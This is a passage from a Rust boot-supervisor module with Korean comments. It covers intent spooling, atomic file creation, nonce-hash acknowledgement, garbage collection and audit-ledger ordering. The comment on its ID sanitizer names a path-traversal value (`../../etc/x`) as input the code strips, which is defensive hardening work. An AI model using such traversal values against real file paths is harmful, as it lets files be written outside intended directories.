/// ★B3-3(§2-6 ⓑ) **진행 정체 판정 — 순수 함수**. [`fence_verdict`] **위에 독립으로 얹는 층**이다.
///
/// ## 왜 [`fence_verdict`] 안에 넣지 않았는가
/// 그 함수의 설계는 R3 리뷰 verdict 가 날 때까지 **동결**돼 있다(master 지시). 두 축을 한 함수에
/// 합치면 리뷰가 ⓐ 설계를 되돌릴 때 ⓑ 까지 함께 흔들리고, 반대로 ⓑ 를 고칠 때마다 동결된
/// 코드를 건드리게 된다. 층을 나누면 공유하는 것은 호출부 한 줄(`or_else`)뿐이고 두 축은 서로를
/// 모른다 — 어느 쪽이 바뀌어도 다른 쪽 검체는 그대로 유효하다.
///
/// ## 발효 조건은 ⓐ 와 **동형**이다 — 미보고 런은 자르지 않는다
/// `progress_step` 이 비어 있으면 "**한 번도 단계를 보고하지 않았다**"는 뜻이고, 그때 '단계가
/// 멎었다'와 '보고 배선이 아직 없다'는 **구별되지 않는다**. 구별 못 하는 신호로 파괴적 조치를
/// 하면 건강한 부트를 다시 낳는다(이 저장소가 반복해서 맞은 계급이다).
///
/// 보고 주체는 §2-7 러너(B4)라 지금 프로덕션의 모든 런은 이 갈래에 있다 — 즉 이 판정은 배선돼
/// 있으나 **사실상 미발효**다(그 위에 [`SupervisorState::fence_armed`] 봉인이 한 겹 더 있다).
/// B4 가 단계를 보고하기 시작하면 **코드 변경 없이** 발효한다. 그때까지의 안전망은 인텐트
/// 수명([`INTENT_MAX_AGE_SECS`])이다.
///
/// (ⓒ 절대 마감은 별도 기구를 두지 않는다 — A17 · [`INTENT_MAX_AGE_SECS`] 문서 참조.)
pub fn progress_verdict(run: &BootRunActive, now: f64) -> Option<&'static str> {
    if run.progress_step.is_empty() {
        return None;
    }
    if now - run.progress_at > PROGRESS_STALL_SECS {
        return Some("progress_stall");
    }
    None
}

/// (B3-5 · T3-2 · 명세 §5) 롤백 스위치가 꺼진 뒤 **아직 착수하지 않은** 인텐트의 실행 주체를
/// 다시 찍어야 하는가 — 찍어야 하면 새 값을 돌려준다.
///
/// 세 갈래로 **찍지 않는다**: 스위치가 켜져 있거나(롤백이 아니다), 이미 `running` 이거나
/// (러너가 소유했다 — 태어난 대로 완주한다), 이미 python 이거나(멱등 — 매 틱 쓰기를 막는다).
/// 방향이 한쪽뿐인 것은 의도다: 스위치를 다시 올려도 python 으로 남는다(보수적인 쪽).
pub fn resnapshot_executor(
    state: IntentState,
    current: &str,
    v2_enabled: bool,
) -> Option<&'static str> {
    if v2_enabled || state != IntentState::Pending || current == EXECUTOR_PYTHON {
        return None;
    }
    Some(EXECUTOR_PYTHON)
}

/// 손상 인텐트의 미러 줄에 싣는 원문 앞부분 길이 — 전문을 실으면 로그가 폭주한다.
const UNREADABLE_SNIPPET_CHARS: usize = 200;

/// 감독자 수명당 남기는 `state_unreadable` **terminal 기록 수 상한**.
///
/// ## 왜 상한이 필요한가 — 두 계약이 부딪힌다
/// 명세 §2-6 은 손상 인텐트를 terminal 로 **기록**하라고 하고, 이 모듈의 다른 불변식은 스풀이
/// **무한 성장하지 않을 것**을 요구한다(`gc_is_not_starved_by_the_judgement_cap`). 손상 파일이
/// 홍수처럼 들어오면 둘은 정면으로 부딪힌다 — 전부 기록하면 `.done` 이 그만큼 쌓인다.
///
/// 해소는 '기록을 포기' 가 아니라 **유계**다: 현실적인 손상(몇 건)은 전부 기록으로 남고, 홍수는
/// 상한에서 멈춘 뒤 종전 삭제 경로로 흘러간다. 그리고 **멈췄다는 사실 자체가 가청화된다** —
/// 이 모듈이 `undeletable`·`budget_pressure` 에서 쓰는 규약 그대로다. 남는 기록 수가 손상 파일
/// 수와 무관한 상수라는 점이 핵심이다(상한만 키우는 수리로는 통과하지 못한다).
const MAX_UNREADABLE_RECORDS: usize = 8;

/// (B3-5 · 명세 §2-6 · H-LEASE-3) 손상 인텐트를 **terminal `state_unreadable` 로 닫는다**.
///
/// 종전에는 `intent_discarded` 한 줄만 남기고 파일을 지웠다. 그러면 나중에 "그 선언이 실행됐는가 ·
/// 왜 사라졌는가" 를 판정할 근거가 **디스크에 남지 않는다** — 명세가 terminal 기록을 요구하는
/// 이유이고, `TerminalKind::StateUnreadable` 이 열거에만 있고 아무도 쓰지 않던 이유이기도 하다.
///
/// 손상 파일에는 파싱된 인텐트가 없다(그래서 이 갈래가 미구현으로 남았다). 파일 stem 을 id 로
/// 삼아 **최소 인텐트를 합성**해 닫는다. 손상 바이트 자체는 교체되지만 앞부분을 미러 줄에 실어
/// 포렌식 가치를 남긴다.
///
/// 반환 = 닫는 데 성공했는가. **실패하면 호출부가 종전 삭제 경로로 흘려보낸다** — 어느 쪽으로도
/// 쓰레기가 영원히 남으면 안 된다. 성공했으면 파일은 이미 `.done` 으로 이름이 바뀌었으므로
/// 호출부는 삭제를 시도하지 않는다(시도하면 실패해 `undeletable` 캐시에 쌓이고 매 틱 소음이 된다).
fn close_unreadable(daemon: &Arc<Daemon>, dir: &Path, p: &Path, now: f64) -> bool {
    let Some(id) = p.file_stem().and_then(|s| s.to_str()).map(sanitize_id) else {
        return false;
    };
    let head: String = std::fs::read_to_string(p)
        .unwrap_or_default()
        .chars()
        .take(UNREADABLE_SNIPPET_CHARS)
        .collect();
    let synth = BootIntent {
        id: id.clone(),
        v: INTENT_SCHEMA_V,
        action_token: String::new(),
        lane: String::new(),
        surface_id: None,
        created_at: now,
        attempts: 0,
        next_attempt_at: 0.0,
        reason: String::new(),
        decl_origin: String::new(),
        claim_rc: None,
        claim_at: None,
        decl_id: id.clone(),
        executor: String::new(),
        generation: 0,
        state: IntentState::Pending,
        terminal: None,
    };
    let t = Terminal::new(
        TerminalKind::StateUnreadable,
        "인텐트 JSON 을 판독할 수 없다(파싱 실패)",
        "재선언이 재개 신호다 — 같은 좌석에서 다시 선언하면 새 인텐트로 처리된다",
    );
    match close_intent(dir, &synth, t, now) {
        Ok(_) => {
            publish(
                daemon,
                "boot_supervisor.state_unreadable",
                json!({"id": id, "path": p.to_string_lossy(), "head": head}),
            );
            true
        }
        Err(e) => {
            publish(
                daemon,
                "boot_supervisor.state_unreadable_failed",
                json!({"id": id, "path": p.to_string_lossy(), "error": e}),
            );
            false
        }
    }
}

/// (B5 · §2-8) 논스의 sha256 16진 문자열 — 데몬은 **해시만** 들고 원문을 저장하지 않는다.
pub fn nonce_hash(nonce: &str) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(nonce.as_bytes());
    format!("{:x}", h.finalize())
}

/// (B5 · §2-8 · T1-7) 에코 판정용 **파생 토큰** — `sha256(nonce)[:8]`.
///
/// 디렉티브 본문에는 논스만 싣고 이 값은 **싣지 않는다**. 그래야 붙여넣기 에코만으로는 만들 수
/// 없다 — T1-7 이 지적한 치명 결함(주입 에코가 그대로 ack 가 되는 것)을 원천에서 막는 형태다.
pub fn echo_token(nonce: &str) -> String {
    nonce_hash(nonce)[..8].to_string()
}

/// (B5 · §2-8 · T1-6) **ack 판정** — intent 일치 ∧ 해시 일치.
///
/// ## 왜 세대를 보지 않는가
/// 명세 §2-8 원문은 `ack.generation == boot_nonce.generation` 이었으나 T1-6 이 그것을 고쳤다:
/// Reconcile 이 같은 주입을 이월할 때 세대만 오르면 노드는 새 논스를 모르는데 ack 가 깨져
/// **degraded** 가 된다. 논스는 **intent 단위 1개**이고 세대는 **fencing 전용**이다.
pub fn ack_nonce_ok(nonce: Option<&BootNonce>, ack: Option<&BootAck>) -> bool {
    match (nonce, ack) {
        (Some(n), Some(a)) => a.intent == n.intent && a.nonce_hash == n.hash,
        // arm 이 없으면 ack 는 판정 대상이 아니다(사전 ACK 봉인).
        _ => false,
    }
}

/// 실패 후 다음 시도 시각 — **선형 백오프**(쿨다운 × 시도횟수).
pub fn backoff_until(attempts: u32, now: f64) -> f64 {
    now + RETRY_COOLDOWN_SECS * f64::from(attempts.max(1))
}

/// 인텐트 id 정규화. 파일명이 되므로 경로 분리자·상대참조를 **전부** 떨군다
/// (`../../etc/x` 같은 값이 스풀 밖 파일을 만들면 안 된다).
pub fn sanitize_id(raw: &str) -> String {
    let s: String = raw
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .take(64)
        .collect();
    if s.is_empty() {
        "intent".to_string()
    } else {
        s
    }
}

/// 감독자가 원장에 남기는 한 줄. **배달이 아니라 기계 유래 표식**이다
/// (`Origin::Boot` 기동 표식과 같은 성격 — delivery.rs `Origin::Supervisor` 문서 참조).
pub fn ledger_line(it: &BootIntent, action: BootAction) -> String {
    format!(
        "[cys-supervisor] boot-intent id={} action={} lane={} reason={}",
        it.id,
        action.as_str(),
        if it.lane.is_empty() { "-" } else { &it.lane },
        if it.reason.is_empty() { "-" } else { &it.reason }
    )
}

// ══════════════════════════════════════════════════════════════════════════════
// 스풀 — 디스크 계층
// ══════════════════════════════════════════════════════════════════════════════

/// 스풀 디렉터리. `state_dir` 하위이므로 **부서 격리를 자동 상속**한다.
pub fn spool_dir(socket_path: &Path) -> PathBuf {
    state_dir(socket_path).join(SPOOL_DIR_NAME)
}

/// 스풀 디렉터리 보장 + unix 권한 **재강제**.
///
/// `create_dir_all` 은 mode 를 **생성 시에만** 적용한다 — 이전 실행이 넓은 권한으로 남긴
/// 디렉터리는 그대로다. 그래서 매번 `set_permissions` 로 조인다(state.rs `write_operator_token`
/// 의 0600 재강제와 같은 규약).
fn ensure_spool(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

fn intent_path(dir: &Path, id: &str) -> PathBuf {
    dir.join(format!("{id}.json"))
}

/// 인텐트를 스풀에 **원자적으로** 적는다(tmp → rename). unix 는 0600.
fn write_intent(dir: &Path, it: &BootIntent) -> Result<PathBuf, String> {
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    let body = serde_json::to_string(&it.to_value()).map_err(|e| format!("직렬화 실패: {e}"))?;
    let final_path = intent_path(dir, &it.id);
    let tmp = dir.join(format!("{}.json.tmp", it.id));
    {
        use std::io::Write;
        #[cfg(unix)]
        let mut f = {
            use std::os::unix::fs::OpenOptionsExt;
            std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o600)
                .open(&tmp)
                .map_err(|e| format!("임시 파일 열기 실패: {e}"))?
        };
        #[cfg(not(unix))]
        let mut f = std::fs::File::create(&tmp).map_err(|e| format!("임시 파일 열기 실패: {e}"))?;
        f.write_all(body.as_bytes())
            .map_err(|e| format!("쓰기 실패: {e}"))?;
    }
    std::fs::rename(&tmp, &final_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("rename 실패: {e}")
    })?;
    Ok(final_path)
}

/// 선언 id 산출(명세 §2-5). **데몬이 계산한다** — 클라이언트는 재료(`session_id`·
/// `prompt_digest`)만 주고 `surface_id`·`lane` 은 데몬이 도출한 값이다.
///
/// 왜 id 를 선언 내용에서 뽑는가: 종전 id 는 `데몬세대-epoch-sid-카운터` 라 **매 호출이 새 id**
/// 였다. 그래서 같은 선언 이벤트가 재전송돼도(훅 재실행·중복 배달) 인텐트가 하나 더 생겼다.
/// 내용 기반 id 는 재전송을 `O_EXCL` 로 접고(dedup), 오너의 **정당한 재선언**은 앞 인텐트가
/// terminal 로 `.done` 이 되어 있으므로 새 파일로 통과한다(시뮬 T1-3).
///
/// 32 자로 자르는 이유: 이 값이 파일명이며 sha256 전문(64)은 Windows 경로 예산을 필요 이상으로
/// 먹는다. hex 32 = 128 비트라 우발 충돌은 실무상 0 이다.
pub fn compute_decl_id(
    lane: &str,
    surface_id: Option<u64>,
    session_id: &str,
    prompt_digest: &str,
) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    // 구분자를 넣는 이유: 없으면 ("ab","c") 와 ("a","bc") 가 같은 해시가 된다.
    h.update(lane.as_bytes());
    h.update(b"|");
    h.update(surface_id.map(|s| s.to_string()).unwrap_or_default().as_bytes());
    h.update(b"|");
    h.update(session_id.as_bytes());
    h.update(b"|");
    h.update(prompt_digest.as_bytes());
    format!("{:x}", h.finalize()).chars().take(32).collect()
}

/// [`enqueue`] 요청. 종전 9개 위치 인자는 호출부에서 순서를 틀리기 쉬웠다(같은 타입이 이웃한
/// `reason`/`decl_origin`, `claim_rc`/`claim_at` 자리).
pub struct EnqueueReq<'a> {
    pub decl_id: &'a str,
    pub action: BootAction,
    /// 레인 소켓 경로. **항상 빈 값**이다(수신 데몬 자신의 레인 — R3-P2-6).
    pub lane: &'a str,
    pub surface_id: Option<u64>,
    pub reason: &'a str,
    pub decl_origin: &'a str,
    pub claim_rc: Option<i64>,
    pub claim_at: Option<f64>,
    /// 실행 주체 스냅샷([`EXECUTOR_RUNNER`]·[`EXECUTOR_PYTHON`]).
    pub executor: &'a str,
}

/// [`enqueue`] 의 귀결. 셋 다 **정상**이며 오류가 아니다 — 훅은 이 값을 그대로 고지한다.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum EnqueueOutcome {
    /// 새 인텐트가 원자적으로 등록됐다.
    Enqueued { path: PathBuf },
    /// 같은 `decl_id` 가 이미 있다 = **같은 선언 이벤트의 재전송**. 새 파일 0.
    Dedup { path: PathBuf },
    /// 같은 좌석에 진행 중 인텐트가 있다 — **기록은 하되 실행하지 않는다**(G1: 1 기록·0 실행).
    Superseded { path: PathBuf, by: String },
}

impl EnqueueOutcome {
    /// 와이어 철자(훅 고지·RPC 응답 토큰).
    pub fn as_str(&self) -> &'static str {
        match self {
            EnqueueOutcome::Enqueued { .. } => "enqueued",
            EnqueueOutcome::Dedup { .. } => "dedup",
            EnqueueOutcome::Superseded { .. } => "superseded",
        }
    }
    #[allow(dead_code)] // ← B2-b 훅 CLI 고지문이 경로를 인용한다(위 ALL 주석의 시한과 같다)
    pub fn path(&self) -> &Path {
        match self {
            EnqueueOutcome::Enqueued { path }
            | EnqueueOutcome::Dedup { path }
            | EnqueueOutcome::Superseded { path, .. } => path,
        }
    }
}

/// 인텐트를 **원자적으로** 새로 만든다(`O_EXCL`). 이미 있으면 `Ok(None)` = dedup.
///
/// 왜 tmp→rename 이 아니라 `create_new` 인가: tmp→rename 은 **덮어쓰기**라 두 연결이 같은
/// decl_id 로 동시에 들어오면 둘 다 성공하고 뒤엣것이 앞엣것의 `attempts` 를 0 으로 되돌린다
/// (시도 상한의 조용한 확장). `create_new` 는 커널이 유일성을 보증한다 — 연결별 tokio task
/// 병행에서도 원자다.
fn insert_intent_exclusive(dir: &Path, it: &BootIntent) -> Result<Option<PathBuf>, String> {
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    let body = serde_json::to_string(&it.to_value()).map_err(|e| format!("직렬화 실패: {e}"))?;
    let path = intent_path(dir, &it.id);
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    match opts.open(&path) {
        Ok(mut f) => {
            use std::io::Write;
            f.write_all(body.as_bytes()).map_err(|e| format!("쓰기 실패: {e}"))?;
            Ok(Some(path))
        }
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => Ok(None),
        Err(e) => Err(format!("인텐트 생성 실패: {e}")),
    }
}

/// terminal 기록 + **즉시 `.done` rename**(시뮬 T1-3).
///
/// rename 이 실패해도 terminal 기록 자체는 남는다(파일 **내용**이 진실이고 이름은 GC 편의다).
/// 다만 그 경우 다음 재선언이 dedup 으로 접힐 수 있으므로 오류를 삼키지 않고 돌려준다.
pub fn close_intent(
    dir: &Path,
    it: &BootIntent,
    t: Terminal,
    now: f64,
) -> Result<PathBuf, String> {
    let mut closed = it.clone();
    closed.state = IntentState::Terminal;
    closed.terminal = Some(t);
    write_intent(dir, &closed)?;
    let from = intent_path(dir, &it.id);
    let to = dir.join(format!("{}.{}{}", it.id, now as u64, DONE_SUFFIX));
    std::fs::rename(&from, &to).map_err(|e| format!("done rename 실패: {e}"))?;
    Ok(to)
}

/// 같은 좌석에 **진행 중**(pending|running)인 다른 선언이 있으면 그 id.
///
/// 스풀을 훑는 비용을 감수하는 이유: 이 판정이 곧 G1("실행은 항상 ≤1")이다. 상한은
/// [`MAX_GC_ENTRIES`] 와 같은 계급으로 유계이며 `.done` 은 애초에 후보가 아니다.
fn inflight_other_for_surface(
    dir: &Path,
    surface_id: Option<u64>,
    decl_id: &str,
) -> Option<String> {
    let sid = surface_id?;
    let rd = std::fs::read_dir(dir).ok()?;
    for ent in rd.flatten().take(MAX_GC_ENTRIES) {
        let p = ent.path();
        let name = p.file_name()?.to_string_lossy().into_owned();
        if name.ends_with(DONE_SUFFIX) || !name.ends_with(".json") {
            continue;
        }
        let stem = name.trim_end_matches(".json").to_string();
        if stem == decl_id {
            continue; // 자기 자신은 이 축의 대상이 아니다(그건 dedup 축이다).
        }
        let Ok(body) = std::fs::read_to_string(&p) else { continue };
        // 손상 파일은 여기서 판정하지 않는다 — 감독자가 state_unreadable 로 닫는다.
        let Some(other) = BootIntent::from_str(&stem, &body) else { continue };
        if other.surface_id == Some(sid)
            && matches!(other.state, IntentState::Pending | IntentState::Running)
        {
            return Some(other.id);
        }
    }
    None
}

/// 부트 인텐트를 스풀에 등록한다 — **감독자의 유일한 입력구**.
///
/// 생산자는 `handlers.rs` 의 `boot.enqueue` RPC arm 하나다. 그 arm 이 지키는 계약 —
/// surface_id 커널 도출(GUI 는 `operator_token` 인가)·lane 자기 고정(항상 빈값)·claim
/// 교차검증·감독자 생존 선검사 — 은 arm 쪽 주석이 정본이고, 이 함수는 검증이 끝난 값을 원자
/// 기록하는 디스크 층이다.
pub fn enqueue(socket_path: &Path, req: &EnqueueReq) -> Result<EnqueueOutcome, String> {
    enqueue_in(&spool_dir(socket_path), req, now_epoch())
}

/// [`enqueue`] 의 **경로·시각 주입판**. 테스트가 임시 디렉터리와 가짜 시각으로 구동한다
/// (플랫폼별 `state_dir` 해소에 의존하지 않아 Windows 에서도 같은 코드가 시험된다).
fn enqueue_in(dir: &Path, req: &EnqueueReq, now: f64) -> Result<EnqueueOutcome, String> {
    let id = sanitize_id(req.decl_id);
    let it = BootIntent {
        id: id.clone(),
        v: INTENT_SCHEMA_V,
        action_token: req.action.as_str().to_string(),
        lane: req.lane.to_string(),
        surface_id: req.surface_id,
        created_at: now,
        attempts: 0,
        next_attempt_at: 0.0,
        reason: req.reason.to_string(),
        decl_origin: req.decl_origin.to_string(),
        claim_rc: req.claim_rc,
        claim_at: req.claim_at,
        decl_id: id,
        executor: req.executor.to_string(),
        generation: 0,
        state: IntentState::Pending,
        terminal: None,
    };
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    // ★순서 계약: **원자 insert 가 먼저**다. 진행 중 판정을 먼저 하면 그 사이에 다른 연결이
    //   같은 decl_id 를 넣어 두 파일이 생길 수 있다 — 유일성은 커널이 보증하게 두고, 그 다음에
    //   좌석 점유를 판정한다.
    let Some(path) = insert_intent_exclusive(dir, &it)? else {
        return Ok(EnqueueOutcome::Dedup { path: intent_path(dir, &it.id) });
    };
    if let Some(by) = inflight_other_for_surface(dir, req.surface_id, &it.id) {
        // G1: **기록 1 · 실행 0**. 기록조차 안 하면 오너에겐 "선언했는데 아무 흔적도 없다" 가
        // 되고, 실행까지 하면 같은 좌석에 부트가 둘이 된다.
        let closed = close_intent(
            dir,
            &it,
            Terminal::new(
                TerminalKind::Superseded,
                &format!("by:{by}"),
                &format!("진행 중 부트 {by} 가 끝난 뒤 다시 선언하십시오"),
            ),
            now,
        )?;
        return Ok(EnqueueOutcome::Superseded { path: closed, by });
    }
    Ok(EnqueueOutcome::Enqueued { path })
}

/// 스풀 1회 스캔 결과.
struct Scan {
    /// 파싱에 성공한 인텐트(판정 후보 · [`MAX_SCAN_ENTRIES`] 상한).
    intents: Vec<BootIntent>,
    /// 디스크에서 즉시 지울 대상 — (경로, 사유). 파싱 불가·mtime 초과분.
    /// ★판정 상한과 **독립**으로 채워진다([`MAX_GC_ENTRIES`]) — 그러지 않으면 정렬 앞쪽이
    ///   살아있는 인텐트로 차 있는 동안 뒤쪽 쓰레기가 영원히 검사되지 않는다.
    garbage: Vec<(PathBuf, &'static str)>,
    /// 이번 틱에 스풀에 존재한 id **전부**(맵 retain·상한 집행의 기준집합).
    /// ★여기는 자르지 않는다 — 자르면 스풀에 실재하는 인텐트의 예산이 '없는 것' 취급돼
    ///   조용히 회수될 수 있고, 그 방향이 곧 유계 파기다.
    present: std::collections::HashSet<String>,
    /// 다음 틱이 검사를 시작할 위치(회전 커서).
    next_cursor: usize,
}

/// 스풀을 읽는다. **`*.json` 만** 본다 — 로그·tmp 는 인텐트가 아니다.
///
/// 디스크 mtime GC: 파싱 여부와 무관하게 mtime 이 [`INTENT_MAX_AGE_SECS`] 를 넘긴 파일은
/// 폐기 대상이다(본문이 깨져 `created_at` 을 못 읽는 파일도 반드시 사라지게 하는 층).
///
/// ## 두 상한은 **독립 축**이다 (결함 2b 수리)
///
/// 종전은 정렬 직후 `names.truncate(MAX_SCAN_ENTRIES)` 하나로 **판정과 GC 를 함께** 잘랐다.
/// 그러면 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는) 인텐트로 차 있는 동안 그 뒤의 쓰레기는
/// **영원히** 검사되지 않는다 = 스풀 무한 성장. 그래서:
///   · 한 틱이 **검사**하는 엔트리 수 = [`MAX_GC_ENTRIES`] (틱 길이의 유계)
///   · 그중 **판정 후보로 올리는** 인텐트 수 = [`MAX_SCAN_ENTRIES`] (한 틱이 볼 인텐트의 유계)
/// 검사 예산을 다 쓴 인텐트는 버려지지 않고 **다음 틱**에 온다 — 그 연결을 **회전 커서**가
/// 만든다. 고정 시작점이면 상한 뒤쪽은 상한을 아무리 키워도 기아 상태로 남는다.
fn scan_spool(dir: &Path, now: f64, cursor: usize) -> Scan {
    let mut intents = Vec::new();
    let mut garbage = Vec::new();
    let mut present = std::collections::HashSet::new();
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    };
    let mut names: Vec<PathBuf> = rd
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "json"))
        .collect();
    names.sort();
    let stem = |p: &Path| -> String {
        p.file_stem()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default()
    };
    for p in &names {
        let id = stem(p);
        if !id.is_empty() {
            present.insert(id);
        }
    }
    let total = names.len();
    if total == 0 {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    }
    let start = cursor % total;
    let examined = total.min(MAX_GC_ENTRIES);
    for k in 0..examined {
        let p = &names[(start + k) % total];
        let id = stem(p);
        if id.is_empty() {
            continue;
        }
        // ① 디스크 mtime GC — **metadata 만** 본다. 본문을 못 읽어도 늙은 파일은 사라진다.
        let too_old = std::fs::metadata(p)
            .and_then(|m| m.modified())
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| now - d.as_secs_f64() > INTENT_MAX_AGE_SECS)
            .unwrap_or(false);
        if too_old {
            garbage.push((p.clone(), "mtime_gc"));
            continue;
        }
        // ② 본문 파싱 — 실패는 기본값 채우기가 아니라 폐기다.
        match std::fs::read_to_string(p) {
            Ok(body) => match BootIntent::from_str(&id, &body) {
                // 판정 후보 상한은 **여기서만** 건다 — 위 GC 는 이 상한에 굶지 않는다.
                Some(it) => {
                    if intents.len() < MAX_SCAN_ENTRIES {
                        intents.push(it);
                    }
                }
                None => garbage.push((p.clone(), "unparsable")),
            },
            // 읽기 실패는 **폐기하지 않는다** — 일시적 I/O 오류로 인텐트를 잃으면
            // 부트가 조용히 사라진다(오살보다 오탐이 낫다는 이 저장소의 방향).
            Err(_) => {}
        }
    }
    Scan {
        intents,
        garbage,
        present,
        next_cursor: (start + examined) % total,
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 실행 — 감독자가 '낳는' 유일한 행위
// ══════════════════════════════════════════════════════════════════════════════

/// (P2 · R3-P2-5) 실행 실패의 **두 계급** — 접는 방향이 서로 다르다.
#[derive(Clone, Debug, PartialEq)]
pub enum RunErr {
    /// 일시 실패(스폰 실패 등) — 백오프 후 **재시도** 대상이다.
    Retry(String),
    /// 전제 붕괴(claim_stale 등) — 재시도가 무의미하므로 인텐트를 **폐기**한다.
    /// 문자열은 폐기 사유(`intent_retired` 이벤트 페이로드로 나간다).
    Retire(&'static str),
}

/// 행위 실행자. 함수 포인터인 것은 테스트가 **스폰 없이** 루프를 구동하기 위해서다
/// (실 프로세스를 낳지 않고 유계성·순서 계약을 전수 시험한다).
type Runner = fn(&Arc<Daemon>, &BootIntent, BootAction) -> Result<String, RunErr>;

/// 스풀 항목 **제거자**. 함수 포인터인 것은 `Runner` 와 같은 이유다 — "삭제가 계속 실패한다"
/// 는 상태를 테스트가 **결정론**으로 만들 수 있어야 한다. 플랫폼 권한 조작(디렉터리 0500·
/// 읽기전용 속성)에 기대면 macOS·Windows·CI 가 서로 다른 것을 시험하게 되고, 그중 하나라도
/// "실은 삭제에 성공" 하면 유계 검체가 조용히 공전한다.
type Remover = fn(&Path) -> bool;

/// 프로덕션 제거자 — 반환값은 "**이제 이 경로에 파일이 없다**" 이다(성공 판정의 정의처).
///
/// ★Windows 가 주 경로다: 생산자(셸·훅 · U-24)가 남긴 파일에 읽기전용 속성이 걸려 있으면
/// `remove_file` 은 영구히 실패한다. `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라
/// Windows 에서 아무 것도 고치지 않으므로, 그 한 겹을 여기서 만든다(속성 1회 해제 후 재시도).
/// unix 에서 파일 삭제 권한은 **디렉터리** 권한이 결정하므로 같은 조작이 의미가 없고,
/// `set_readonly(false)` 는 0600 을 0666 으로 **넓히기** 때문에 unix 에서는 하지 않는다.
/// 다른 프로세스가 연 파일(백신·생산자 셸)은 그래도 실패할 수 있다 — 그 경우의 유계는
/// 음성 캐시가 책임진다.
fn remove_spool_file(p: &Path) -> bool {
    if std::fs::remove_file(p).is_ok() {
        return true;
    }
    #[cfg(windows)]
    {
        if let Ok(md) = std::fs::metadata(p) {
            let mut perm = md.permissions();
            if perm.readonly() {
                #[allow(clippy::permissions_set_readonly_false)]
                perm.set_readonly(false);
                if std::fs::set_permissions(p, perm).is_ok() && std::fs::remove_file(p).is_ok() {
                    return true;
                }
            }
        }
    }
    // 남이 이미 지웠으면 목적은 달성됐다 — 실패로 세면 음성 캐시가 헛돈다.
    !p.exists()
}

/// 인텐트 1건을 실행한다 — **원장 기록이 행위보다 앞이다**.
///
/// ★불변식(delivery.rs ①의 감독자 축): 이 순서가 뒤집히면, 감독자가 낳은 부트 체인이 pane 에
/// 글자를 밀어 넣는 순간에 원장에는 아직 아무 근거가 없다. 그 창에서 임무 게이트는 기계 push 를
/// **오너 임무로 오인**하고 자율 착수 권한을 오발급한다. `record_audited` 호출이 `runner` 호출
/// **앞**에 있어야 한다는 이 사실을 검체(`H-BOOT-SUP-2`)와 단위테스트가 소스 핀으로 못박는다.
fn dispatch_one(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    action: BootAction,
    runner: Runner,
) -> Result<String, RunErr> {
    crate::delivery::record_audited(
        daemon,
        it.surface_id.unwrap_or(0),
        &ledger_line(it, action),
        crate::delivery::Origin::Supervisor,
        None,
    );
    runner(daemon, it, action)
}

/// (P2 · R3-P2-5) 레지스트리 재실측의 **순수 판정** — "이 surface 가 지금 master 를 쥐고
/// 살아 있는가". 디스패치 직전의 신선한 실측이 판정의 전부이며, 인텐트가 나른 claim 타임스탬프
/// 는 어떤 판정에도 쓰지 않는다(**타임스탬프 이월 금지** — 이월하면 부트의 결박 창 300s 를
/// 감독자 합법 지연(수명 1800s+백오프)이 넘겨 지연 꼬리에서 rc6 이 결정론으로 재발한다).
pub fn master_holds(registry_master: Option<u64>, sid: u64, alive: bool) -> bool {
    registry_master == Some(sid) && alive
}

/// (P2) PATH **선두에 데몬 exe_dir** 를 얹는다 — 부트 체인은 맨이름 `"cys"` 를 상시 호출하는데
/// 데몬 env PATH 에는 앱 디렉터리가 없을 수 있다(macOS launchd 최소 PATH·Windows GUI 기동).
/// 이 주입 없이는 감독자 부트 전량이 첫 `cys` 호출에서 좌초한다 — '맥은 멀쩡한데 Windows 만
/// 깨지는' 전례 계급 그 자체라, **주입 없이 P2 를 켜지 말 것**(2차 성찰 P2-2 고지).
fn path_with_exe_dir_first(exe_dir: &Path, current: Option<std::ffi::OsString>) -> std::ffi::OsString {
    let mut parts: Vec<PathBuf> = vec![exe_dir.to_path_buf()];
    if let Some(cur) = current {
        parts.extend(std::env::split_paths(&cur));
    }
    // join 실패(경로에 분리자 포함 등 — exe_dir 파생값에선 비실재)는 exe_dir 단독으로 접는다:
    // 이 주입의 존재 이유가 'cys 해소 보장'이므로 그 한 조각은 어떤 실패에서도 남긴다.
    std::env::join_paths(parts).unwrap_or_else(|_| exe_dir.as_os_str().to_os_string())
}

/// boot-supervisor.log 의 **경로 규약 단일 소유자**(★R2 note — 사본 금지).
///
/// 스풀의 부모 = 데몬 상태 디렉터리(`state_dir(socket)` — unix 는 소켓의 부모, Windows 는
/// `%LOCALAPPDATA%\cys[\<slug>]`). 소비자가 셋이라(실행자 `run_ensure_team` · `boot.enqueue`
/// 응답 · 훅 frontdoor note) 문자열을 세 벌로 쓰면 반드시 갈린다. frontdoor 경로에서는
/// **부트 출력이 오직 이 파일에만** 가므로(런 로그가 아예 생기지 않는다) 위치를 못 찾는 것이
